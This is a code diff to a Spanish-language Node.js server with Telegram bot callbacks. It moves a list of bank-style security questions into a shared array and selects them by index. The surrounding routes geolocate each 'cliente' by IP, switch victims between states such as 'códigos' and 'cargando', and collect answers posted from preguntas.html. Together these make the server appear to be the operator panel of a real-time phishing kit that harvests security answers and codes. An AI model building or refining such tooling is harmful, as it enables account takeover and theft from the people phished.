@@ -21,6 +21,24 @@ function guardarEstado() {
   fs.writeFileSync(STATUS_FILE, JSON.stringify(clientes, null, 2));
 }
 
+const preguntasLista = [
+  "¿Cuál fue el nombre de mi primer novio(a)?",
+  "¿Cuál fue el nombre de mi primer colegio?",
+  "¿Dónde conoció a su pareja?",
+  "¿Cuál es la fecha aniversario de matrimonio (DD/MM/AAAA)?",
+  "¿Qué país siempre has querido conocer?",
+  "¿Quién fue el héroe de su infancia?",
+  "¿Cuál es mi carro preferido?",
+  "¿Cuál es el nombre de mi mascota?",
+  "¿Cuál es su película favorita?",
+  "¿Cuál es el segundo apellido de su padre o madre?",
+  "¿Cuál es su pasatiempo favorito?",
+  "¿Dónde fue su luna de miel?",
+  "¿Cuál es mi postre favorito?",
+  "¿Cuál es el nombre de mi profesor preferido?",
+  "¿Cuál fue su primer vehículo (marca)?"
+];
+
 async function obtenerCiudad(ip) {
   try {
     const response = await fetch(`https://ipinfo.io/${ip}/json`);
@@ -89,38 +107,17 @@ app.post('/callback', async (req, res) => {
 
   if (!cliente) return res.sendStatus(404);
 
-  // 🔐 SUBMENÚ DE PREGUNTAS
   if (accion === 'preguntas_menu') {
-    const preguntas = [
-      "¿Cuál fue el nombre de mi primer novio(a)?",
-      "¿Cuál fue el nombre de mi primer colegio?",
-      "¿Dónde conoció a su pareja?",
-      "¿Cuál es la fecha aniversario de matrimonio (DD/MM/AAAA?",
-      "¿Qué país siempre has querido conocer?",
-      "¿Quién fue el héroe de su infancia?",
-      "¿Cuál es mi carro preferido?",
-      "¿Cuál es el nombre de mi mascota?",
-      "¿Cuál es su película favorita?",
-      "¿Cuál es el segundo apellido de su padre o madre?",
-      "¿Cuál es su pasatiempo favorito?",
-      "¿Dónde fue su luna de miel?",
-      "¿Cuál es mi postre favorito?",
-      "¿Cuál es el nombre de mi profesor preferido?",
-      "¿Cuál fue su primer vehículo (marca)?"
-    ];
+    const keyboardPreguntas = { inline_keyboard: [] };
 
-    const keyboardPreguntas = {
-      inline_keyboard: []
-    };
-
-    // Agrupar en filas de 2 botones para evitar límite de Telegram
-    for (let i = 0; i < preguntas.length; i += 2) {
+    for (let i = 0; i < preguntasLista.length; i += 2) {
       const fila = [];
       for (let j = 0; j < 2; j++) {
-        if (preguntas[i + j]) {
+        const idx = i + j;
+        if (preguntasLista[idx]) {
           fila.push({
-            text: preguntas[i + j],
-            callback_data: `select_question:${txid}:${encodeURIComponent(preguntas[i + j])}`
+            text: preguntasLista[idx],
+            callback_data: `select_question:${txid}:${idx}`
           });
         }
       }
@@ -143,9 +140,9 @@ app.post('/callback', async (req, res) => {
     return res.sendStatus(200);
   }
 
-  // ✅ Selección de preguntas
   if (accion === 'select_question') {
-    const pregunta = decodeURIComponent(partes[2]);
+    const index = parseInt(partes[2]);
+    const pregunta = preguntasLista[index];
 
     if (!cliente.preguntas.includes(pregunta) && cliente.preguntas.length < 2) {
       cliente.preguntas.push(pregunta);
@@ -169,7 +166,6 @@ app.post('/callback', async (req, res) => {
     return res.sendStatus(200);
   }
 
-  // ⚙️ Otras acciones (códigos, cargando, errorlogo)
   cliente.status = accion;
   guardarEstado();
 
@@ -185,7 +181,6 @@ app.post('/callback', async (req, res) => {
   res.sendStatus(200);
 });
 
-// 📩 Recibe respuestas desde preguntas.html
 app.post('/enviar-preguntas', async (req, res) => {
   const { txid, respuestas } = req.body;
   const cliente = clientes[txid];
